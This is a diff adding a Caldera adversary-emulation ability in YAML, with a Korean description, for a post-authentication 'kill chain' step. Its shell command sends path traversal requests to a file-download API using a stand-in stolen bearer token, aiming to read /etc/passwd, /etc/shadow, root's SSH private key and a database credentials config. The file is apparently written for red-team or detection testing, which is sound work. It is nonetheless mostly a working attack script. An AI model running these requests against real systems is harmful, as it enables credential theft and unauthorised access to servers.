@@ -1,0 +1,36 @@
+- id: cc33dd44-ee55-4ff6-aa77-bb8899001122
+  name: Post-Auth Sensitive File Access (Kill Chain)
+  description: 인증 후 Path Traversal로 /etc/passwd, /etc/shadow, SSH 키 등 민감 파일에 접근합니다. 인증된 세션이므로 네트워크 센서 우회 가능성이 높습니다.
+  tactic: discovery
+  technique:
+    attack_id: T1083
+    name: File and Directory Discovery
+  platforms:
+    linux:
+      sh:
+        command: |-
+          TARGET="http://#{target.url}"
+          OP_ID="#{operation_id}"
+
+          echo "[*] Kill Chain Step 3: Post-Auth File Access"
+
+          CURL_BASE=( -s -w " HTTP=%{http_code}\n" -o /dev/null
+                      -H "X-Caldera-Op-Id: ${OP_ID}"
+                      -H "X-Caldera-Technique: T1083"
+                      -H "X-Caldera-Ability: cc33dd44-ee55-4ff6-aa77-bb8899001122"
+                      -A "Caldera/${OP_ID}/T1083/cc33dd44"
+                      -H "Authorization: Bearer fake_stolen_token" )
+
+          echo "[1] /etc/passwd"
+          curl "${CURL_BASE[@]}" "${TARGET}/api/files/download?filename=../../../../etc/passwd"
+
+          echo "[2] /etc/shadow"
+          curl "${CURL_BASE[@]}" "${TARGET}/api/files/download?filename=../../../../etc/shadow"
+
+          echo "[3] SSH private key"
+          curl "${CURL_BASE[@]}" "${TARGET}/api/files/download?filename=../../../../root/.ssh/id_rsa"
+
+          echo "[4] Application config (DB credentials)"
+          curl "${CURL_BASE[@]}" "${TARGET}/api/files/download?filename=../../../../opt/app/config/database.yml"
+
+          echo "[*] Post-auth file access complete"
